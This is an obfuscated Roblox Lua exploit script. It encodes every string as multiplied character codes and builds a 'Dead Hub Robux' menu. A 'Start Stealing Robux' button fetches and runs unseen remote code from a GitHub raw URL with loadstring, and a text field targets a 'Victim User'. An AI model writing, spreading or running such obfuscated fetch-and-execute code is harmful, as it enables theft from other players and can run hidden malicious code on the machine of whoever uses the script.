function GigWlrRtAgbPlTpkpqwcrnwQtIPqFLotzyjBkmYYZpzesifwYVlXhMpSwOigUQuSrcGywkVPHacquXyHOObEaOp(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 


local player = game.Players.LocalPlayer

 local OrionLib = loadstring(game:HttpGet((GigWlrRtAgbPlTpkpqwcrnwQtIPqFLotzyjBkmYYZpzesifwYVlXhMpSwOigUQuSrcGywkVPHacquXyHOObEaOp({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,12075,10920,11340,10605,12600,12495,10185,11970,10605,4935,8295,11970,11025,11655,11550,4935,11445,10185,11025,11550,4935,12075,11655,12285,11970,10395,10605}))))()

local Window = OrionLib:MakeWindow({Name = GigWlrRtAgbPlTpkpqwcrnwQtIPqFLotzyjBkmYYZpzesifwYVlXhMpSwOigUQuSrcGywkVPHacquXyHOObEaOp({7140,10605,10185,10500,3360,7560,12285,10290,3360,8610,11655,10290,12285,12600}), HidePremium = false, SaveConfig = true, ConfigFolder = GigWlrRtAgbPlTpkpqwcrnwQtIPqFLotzyjBkmYYZpzesifwYVlXhMpSwOigUQuSrcGywkVPHacquXyHOObEaOp({8295,11970,11025,11655,11550,8820,10605,12075,12180})})

--[[
Name = <string> - The name of the UI.
HidePremium = <bool> - Whether or not the user details shows Premium status or not.
SaveConfig = <bool> - Toggles the config saving in the UI.
ConfigFolder = <string> - The name of the folder where the configs are saved.
IntroEnabled = <bool> - Whether or not to show the intro animation.
IntroText = <string> - Text to show in the intro animation.
IntroIcon = <string> - URL to the image you want to use in the intro animation.
Icon = <string> - URL to the image you want displayed on the window.
CloseCallback = <function> - Function to execute when the window is closed.
]]

local Tab = Window:MakeTab({
	Name = GigWlrRtAgbPlTpkpqwcrnwQtIPqFLotzyjBkmYYZpzesifwYVlXhMpSwOigUQuSrcGywkVPHacquXyHOObEaOp({7140,10605,10185,10500,3360,7560,12285,10290,3360,8610,11655,10290,12285,12600}),
	Icon = GigWlrRtAgbPlTpkpqwcrnwQtIPqFLotzyjBkmYYZpzesifwYVlXhMpSwOigUQuSrcGywkVPHacquXyHOObEaOp({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935,5460,5460,5880,5355,5355,5460,5565,5985,5985,5880}),
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Section = Tab:AddSection({
	Name = GigWlrRtAgbPlTpkpqwcrnwQtIPqFLotzyjBkmYYZpzesifwYVlXhMpSwOigUQuSrcGywkVPHacquXyHOObEaOp({25200,16695,17220,15225,25200,16695,17220,15225,25200,16695,17220,15225})
})

--[[
Name = <string> - The name of the section.
]]

OrionLib:MakeNotification({
	Name = GigWlrRtAgbPlTpkpqwcrnwQtIPqFLotzyjBkmYYZpzesifwYVlXhMpSwOigUQuSrcGywkVPHacquXyHOObEaOp({8715,10395,11970,11025,11760,12180,3360,7980,11655,10185,10500,10605,10500}),
	Content = GigWlrRtAgbPlTpkpqwcrnwQtIPqFLotzyjBkmYYZpzesifwYVlXhMpSwOigUQuSrcGywkVPHacquXyHOObEaOp({7245,11550,11130,11655,12705}),
	Image = GigWlrRtAgbPlTpkpqwcrnwQtIPqFLotzyjBkmYYZpzesifwYVlXhMpSwOigUQuSrcGywkVPHacquXyHOObEaOp({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935,5460,5460,5880,5355,5355,5460,5565,5985,5985,5880}),
	Time = 5
})

Tab:AddButton({
	Name = GigWlrRtAgbPlTpkpqwcrnwQtIPqFLotzyjBkmYYZpzesifwYVlXhMpSwOigUQuSrcGywkVPHacquXyHOObEaOp({8715,12180,10185,11970,12180,3360,8715,12180,10605,10185,11340,11025,11550,10815,3360,8610,11655,10290,12285,12600}),
	Callback = function()
      		loadstring(game:HttpGet(GigWlrRtAgbPlTpkpqwcrnwQtIPqFLotzyjBkmYYZpzesifwYVlXhMpSwOigUQuSrcGywkVPHacquXyHOObEaOp({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,7245,9240,7140,5250,7875,5145,5250,4935,7140,10605,10185,10500,7560,12285,10290,8610,11655,10290,12285,12600,4935,11970,10605,10710,12075,4935,10920,10605,10185,10500,12075,4935,11445,10185,11025,11550,4935,8400,11340,12075,7140,11655,11550,10185,12180,10605,4830,11340,12285,10185})))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddTextbox({
	Name = GigWlrRtAgbPlTpkpqwcrnwQtIPqFLotzyjBkmYYZpzesifwYVlXhMpSwOigUQuSrcGywkVPHacquXyHOObEaOp({8925,12075,10605,11970,11550,10185,11445,10605,3360,4725,4725,4725,6510}),
	Default = GigWlrRtAgbPlTpkpqwcrnwQtIPqFLotzyjBkmYYZpzesifwYVlXhMpSwOigUQuSrcGywkVPHacquXyHOObEaOp({9030,11025,10395,12180,11025,11445,3360,8925,12075,10605,11970}),
	TextDisappear = false,
	Callback = function(Value)
		print(Value)
	end	  
})    
